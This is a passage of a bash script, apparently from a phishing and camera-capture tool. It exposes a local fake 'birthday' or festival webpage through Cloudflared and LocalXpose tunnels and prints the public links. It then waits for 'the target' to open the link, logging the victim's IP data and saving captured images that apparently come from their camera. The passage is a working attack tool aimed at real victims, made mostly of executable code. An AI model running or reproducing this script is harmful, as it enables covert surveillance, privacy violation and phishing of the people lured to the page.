if [ "$SUBDOMAIN" != false ]; then
    if [ "$args" == "" ]; then
        args="--subdomain $SUBDOMAIN"
    else
        args="$args --subdomain $SUBDOMAIN"
    fi
fi
$cf_command tunnel -url "${local_url}" &> "$tunneler_dir/cf.log" &
$loclx_command tunnel --raw-mode http --https-redirect $args -t "${local_url}" &> "$tunneler_dir/loclx.log" &
sleep 10
cd "$HOME/.website"
if echo $option | grep -q "2"; then
    if ! [ -z "$fest_name" ]; then
        sed -i s/"birthday"/"$fest_name"/g index.html
    fi
fi
if echo $option | grep -q "3"; then
    if ! [ -z "$vid_id" ]; then
         netcheck
         if curl -s -N "https://www.youtube.com/embed/${vid_id}?autoplay=1" | grep -q "https://www.youtube.com/watch?v=${vid_id}"; then
              sed -i s/"6hHmkInZkMQ"/"$vid_id"/g index.html
         else
              echo -e "${error}Inavlid youtube video ID!. Using default value.\007\n"
         fi
    fi
fi
for second in {1..10}; do
    if [ -f "$tunneler_dir/cf.log" ]; then
        cflink=$(grep -Eo "https://[-0-9a-z.]{4,}.trycloudflare.com" "$tunneler_dir/cf.log")
        sleep 1
    fi
    if ! [ -z "$cflink" ]; then
        cfcheck=true
        break
    else
        cfcheck=false
    fi
done
for second in {1..10}; do
    if [ -f "$tunneler_dir/loclx.log" ]; then
        loclxlink=$(grep -o "[-0-9a-z.]*.loclx.io" "$tunneler_dir/loclx.log")
        sleep 1
    fi
    if ! [ -z "$loclxlink" ]; then
        loclxcheck=true
        loclxlink="https://${loclxlink}"
        break
    else
        loclxcheck=false
    fi
done
if ( $cfcheck && $loclxcheck ); then
    echo -e "${success}${orange}Cloudflared and Loclx have started successfully!\n"
    url_manager "$cflink" 1 2
    url_manager "$loclxlink" 3 4
elif ( $cfcheck &&  ! $loclxcheck ); then
    echo -e "${success}${orange}Cloudflared has started successfully!\n"
    url_manager "$cflink" 1 2
elif ( $loclxcheck &&  ! $cfcheck ); then
    echo -e "${success}${green}Loclx has started successfully!\n"
    url_manager "$loclxlink" 1 2
elif ( $cfcheck && $loclxcheck &&  ! $loclxcheck ); then
    echo -e "${success}${orange}Cloudflared and Loclx have started successfully!\n"
    url_manager "$cflink" 1 2
    url_manager "$loclxlink" 3 4
else
    echo -e "${error}Tunneling failed! Start your own port forwarding/tunneling service at port ${PORT}\n";
fi
sleep 1
rm -rf ip.txt
echo -e "${info}${bblue}Waiting for the next step... ${cyan}Press ${white}Ctrl + C ${cyan}to exit\n"
while true; do
    if [[ -e "ip.txt" ]]; then
        echo -e "\007${success}The target opened the link!\n"
        while IFS= read -r line; do
            echo -e "${cyan}[${purple}x${cyan}] :: ${bblue} $line"
        done < ip.txt
        echo ""
        cat ip.txt >> "$cwd/ip.txt"
        rm -rf ip.txt
    fi
    sleep 0.5
    if [[ -e "log.txt" ]]; then
        echo -e "\007${success}Image downloaded! Check directory!\n"
        file=`ls | grep png`
        mv -f $file $FOL
        rm -rf log.txt
    fi
    sleep 0.5
done
